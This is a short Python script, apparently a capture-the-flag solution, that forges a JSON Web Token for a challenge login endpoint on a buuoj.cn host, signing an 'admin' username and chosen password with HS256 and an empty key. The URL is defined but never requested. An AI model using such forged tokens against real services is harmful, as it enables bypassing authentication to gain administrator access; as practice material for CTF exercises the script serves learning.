import jwt

url = 'http://39e6f2d6-e50d-45c7-b27b-30aa17205cd1.node3.buuoj.cn/api/login'

def jisuan(reg):
    jwt_auth = jwt.encode({'secretid':'0.1','username':'admin','password':'{}'.format(reg),'iat':''},algorithm='HS256',key='').decode('utf-8')

    print(jwt_auth)




jisuan('123')